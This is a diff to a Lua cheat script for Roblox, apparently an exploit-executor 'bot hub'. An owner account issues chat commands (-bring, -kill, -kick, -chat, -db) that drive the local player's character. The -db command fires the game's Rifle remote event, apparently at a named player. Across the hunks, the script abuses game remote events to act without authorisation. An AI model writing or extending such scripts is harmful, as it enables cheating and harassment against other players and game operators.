@@ -762,8 +762,8 @@ drops:Button(
 
 
 local textbs = serv:Channel("Textboxes")
-getgenv().owner = "MiztHubBot"
-local ownerchar  = game.Players[getgenv().owner].Character
+owner = "MiztHubBot"
+local ownerchar  = game.Players[owner].Character
 local selfname =game.Players.LocalPlayer
 local name = game.Players.LocalPlayer.Name 
 local selfchar = game.Players.LocalPlayer.Character
@@ -777,11 +777,11 @@ task.spawn(function()
                     local player = tostring(data.FromSpeaker)
                     local message = tostring(data.Message)
                     local originalchannel = tostring(data.OriginalChannel)
-                   if player == getgenv().owner and message == "-bring" then 
+                   if player == owner and message == "-bring" then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ownerchar.HumanoidRootPart.CFrame
                    end 
                    
-                   if player == getgenv().owner and string.match(message,"-benx" .. name) then 
+                   if player == owner and string.match(message,"-benx" .. name) then 
                       	while true do wait()
 				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = 	ownerchar.HumanoidRootPart.CFrame + 	ownerchar.HumanoidRootPart.CFrame.lookVector * 0.5
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = ownerchar.HumanoidRootPart.CFrame.lookVector * 70
@@ -791,22 +791,22 @@ task.spawn(function()
                    end 
                    
                    	
-                      if player == getgenv().owner and  string.match(message,"-rename") then 
+                      if player == owner and  string.match(message,"-rename") then 
                                         rename_  = string.gsub(message,"-rename","")
                                         
                        ownerchar.Humanoid.DisplayName = rename_
                       
-                    getgenv().owner = rename_ 
+                    
                     
                        
                    end 
-                     if player == getgenv().owner and string.match(message,"-kill " .. name) then 
+                     if player == owner and string.match(message,"-kill " .. name) then 
                       selfchar.Humanoid.Health = 0 
                      end
-                       if player == getgenv().owner and string.match(message,"-kick " .. name) then 
+                       if player == owner and string.match(message,"-kick " .. name) then 
                       game.Players.LocalPlayer:Kick("get kicked dumbass")
                        end
-                 if player == getgenv().owner and string.match(message,"-db") then 
+                 if player == owner and string.match(message,"-db") then 
                            local plr_  = string.gsub(message,"-db","")
 print(newmsg)
 selfchar.Humanoid:UnequipTools()
@@ -822,7 +822,7 @@ local args = {
 game:GetService("ReplicatedStorage"):WaitForChild("ToolRemoteEvents"):WaitForChild("Rifle"):FireServer(unpack(args))
 
                      end
-                  if player == getgenv().owner and string.match(message,"-chat") then 
+                  if player == owner and string.match(message,"-chat") then 
            local newmsg = string.gsub(message,"-chat","")
 print(newmsg)
 game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(newmsg,"All")
